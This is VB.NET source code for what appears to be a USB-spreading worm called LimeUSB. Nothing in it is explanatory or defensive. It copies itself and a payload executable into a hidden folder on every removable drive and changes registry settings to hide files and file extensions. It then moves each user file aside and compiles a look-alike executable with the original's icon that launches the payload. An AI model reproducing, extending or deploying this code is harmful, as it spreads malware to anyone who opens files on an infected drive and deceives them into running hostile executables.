Imports System.IO
Imports System.Drawing.IconLib

Module Program

    Public Sub Main()
        Initialize()
    End Sub

    Public Sub Initialize()

        ExplorerOptions()

        For Each USB As DriveInfo In DriveInfo.GetDrives()
            Try
                If USB.DriveType = DriveType.Removable AndAlso USB.IsReady Then
                    If Not Directory.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory) Then
                        Directory.CreateDirectory(USB.RootDirectory.ToString() + Settings.WorkDirectory)
                        If Not File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + "IconLib.dll") Then
                            File.WriteAllBytes(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + "IconLib.dll", My.Resources.IconLib)
                        End If
                        File.SetAttributes(USB.RootDirectory.ToString() + Settings.WorkDirectory, FileAttributes.System + FileAttributes.Hidden)
                    End If

                    If Not Directory.Exists((USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + Settings.IconsDirectory)) Then
                        Directory.CreateDirectory((USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + Settings.IconsDirectory))
                    End If

                    If Not File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + Settings.LimeUSBFile) Then
                        File.Copy(Application.ExecutablePath, USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + Settings.LimeUSBFile)
                    End If

                    If Not File.Exists(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + Settings.PayloadFile) Then
                        File.WriteAllBytes(USB.RootDirectory.ToString() + Settings.WorkDirectory + "\" + Settings.PayloadFile, My.Resources.Payload)
                    End If

                    CreteDirectory(USB.RootDirectory.ToString())
                    InfectFiles(USB.RootDirectory.ToString())

                End If
            Catch ex As Exception
            End Try
        Next
    End Sub

    Public Sub ExplorerOptions()
        Dim Key As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", True)
        If Key.GetValue("Hidden") <> 2 Then
            Key.SetValue("Hidden", 2)
        End If
        If Key.GetValue("HideFileExt") <> 1 Then
            Key.SetValue("HideFileExt", 1)
        End If
    End Sub

    Public Sub InfectFiles(Path)
        For Each File In Directory.GetFiles(Path)
            Try
                If CheckIfInfected(File) Then
                    ChangeIcon(File)
                    IO.File.Move(File, File.Insert(3, Settings.WorkDirectory + "\"))
                    CompileFile(File)
                End If
            Catch ex As Exception
            End Try
        Next

        For Each Directory In IO.Directory.GetDirectories(Path)
            If Not Directory.Contains(Settings.WorkDirectory) Then
                InfectFiles(Directory)
            End If
        Next

    End Sub

    Public Function CreteDirectory(USB_Directory As String)
        Try
            For Each Directory In IO.Directory.GetDirectories(USB_Directory)
                If Not Directory.Contains(Settings.WorkDirectory) Then
                    If Not IO.Directory.Exists(Directory.Insert(3, Settings.WorkDirectory + "\")) Then
                        IO.Directory.CreateDirectory(Directory.Insert(3, Settings.WorkDirectory + "\"))
                    End If
                    CreteDirectory(Directory)
                End If
            Next
        Catch ex As Exception
        End Try
        Return False
    End Function

    Public Function CheckIfInfected(File As String)
        Try
            Dim Info As FileVersionInfo = FileVersionInfo.GetVersionInfo(File)
            If Info.LegalTrademarks = Settings.InfectedTrademark Then
                Return False
            Else
                Return True
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Sub ChangeIcon(File As String)
        Try
            Dim FileIcon As Icon = Icon.ExtractAssociatedIcon(File)
            Dim MultiIcon As New MultiIcon()
            Dim SingleIcon As SingleIcon = MultiIcon.Add(Path.GetFileName(File))
            SingleIcon.CreateFrom(FileIcon.ToBitmap(), IconOutputFormat.Vista)
            SingleIcon.Save(Path.GetPathRoot(File) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(File) & ".ico")
        Catch ex As Exception
        End Try
    End Sub

    Public Sub CompileFile(InfectedFile As String)
        Try
            Dim Code = My.Resources.Code
            Code = Replace(Code, "%Payload%", Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.PayloadFile)
            Code = Replace(Code, "%File%", InfectedFile.Insert(3, Settings.WorkDirectory + "\"))
            Code = Replace(Code, "%USB%", Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.LimeUSBFile)
            Code = Replace(Code, "%Lime%", Settings.InfectedTrademark)
            Code = Replace(Code, "LimeUSBModule", Randomz(New Random().Next(6, 12)))
            Code = Replace(Code, "%Guid%", Guid.NewGuid.ToString)

            Dim providerOptions = New Dictionary(Of String, String)
            providerOptions.Add("CompilerVersion", GetOS)
            Dim CodeProvider As New VBCodeProvider(providerOptions)
            Dim Parameters As New CodeDom.Compiler.CompilerParameters
            Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
            If File.Exists(Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(InfectedFile) & ".ico") Then
                OP += " /win32icon:" + Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(InfectedFile) & ".ico"
            End If
            With Parameters
                .GenerateExecutable = True
                .OutputAssembly = InfectedFile
                .CompilerOptions = OP
                .IncludeDebugInformation = False
                .ReferencedAssemblies.Add("System.dll")

                Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
                For Each uii As CodeDom.Compiler.CompilerError In Results.Errors
                    Debug.WriteLine(uii.ToString)
                    Exit Sub
                Next
            End With
        Catch ex As Exception
        End Try
    End Sub

    Public Function GetOS() As String
        Try
            Dim OS = New Devices.ComputerInfo()
            If OS.OSFullName.Contains("7") Then
                Return "v2.0"
            End If
        Catch ex As Exception
        End Try
        Return "v4.0"
    End Function

    Public Function Randomz(ByVal L As Integer)
        Try
            Dim validchars As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            Dim sb As New Text.StringBuilder()
            Dim rand As New Random()
            For i As Integer = 1 To L
                Dim idx As Integer = rand.Next(0, validchars.Length)
                Dim randomChar As Char = validchars(idx)
                sb.Append(randomChar)
            Next i
            Dim randomString = sb.ToString()
            Return randomString
        Catch ex As Exception
            Return False
        End Try
    End Function
End Module

Public Class Settings
    Public Shared InfectedTrademark As String = "Trademark - Lime"
    Public Shared WorkDirectory As String = "$LimeUSB"
    Public Shared LimeUSBFile As String = "LimeUSB.exe"
    Public Shared PayloadFile As String = "Payload.exe"
    Public Shared IconsDirectory = "$LimeIcons"
End Class